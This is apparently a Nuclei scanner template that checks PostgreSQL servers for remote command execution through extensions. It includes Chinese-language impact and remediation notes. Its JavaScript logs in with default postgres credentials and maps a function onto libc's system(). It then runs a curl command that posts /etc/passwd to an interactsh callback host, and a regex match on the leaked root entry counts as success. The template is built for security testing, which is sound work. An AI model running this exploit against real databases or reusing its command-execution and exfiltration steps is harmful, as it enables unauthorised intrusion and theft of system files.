id: pgsql-extensions-rce

info:
  name: PostgreSQL 扩展远程代码执行风险（服务漏洞）
  author: pussycat0x
  severity: high
  description: |
    目标 PostgreSQL 实例允许通过扩展机制加载库并执行系统命令，可能形成远程代码执行面。模板使用内置凭据登录后尝试创建并调用扩展函数，并以命令回显特征作为验证依据。
  impact: |
    - 攻击者可借助 PostgreSQL 扩展机制在数据库服务器上执行系统命令。
    - 成功利用后可能读取主机文件、部署持久化程序、窃取凭据或进一步横向移动。
  remediation: |
    - 撤销非必要用户创建扩展、加载库和执行危险函数的权限。
    - 使用最小权限数据库角色，限制 PostgreSQL 端口来源，并监控可疑扩展创建和系统命令调用。
  reference:
    - https://www.dionach.com/postgresql-9-x-remote-command-execution/
    - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#using-libcso6
    - https://hacktricks.boitatech.com.br/pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions
  metadata:
    verified: true
    max-request: 1
    shodan-query: "product:\"PostgreSQL\""
    vendor: postgresql
    product: postgresql
  tags: postgresql,js,network,rce,vuln
javascript:
  - pre-condition: |
      isPortOpen(Host,Port);
    code: |
      const postgres = require('nuclei/postgres');
      const client = new postgres.PGClient;
      const collab = shurl
      const qry = ["CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;", "SELECT system('curl -X POST -d @/etc/passwd "+ collab +"');"];
      for (const x of qry){
        connected =  client.ExecuteQuery(Host, Port, User, Pass, Db, x);
        Export(connected);
      }

    args:
      Host: "{{Host}}"
      Port: 5432
      User: "{{usernames}}"
      Pass: "{{password}}"
      Db: "{{database}}"
      shurl: http://{{interactsh-url}}

    payloads:
      usernames:
        - postgres
      database:
        - postgres
      password:
        - postgres

    attack: clusterbomb

    matchers:
      - type: regex
        part: interactsh_request
        regex:
          - "root:[x*]:0:0:"
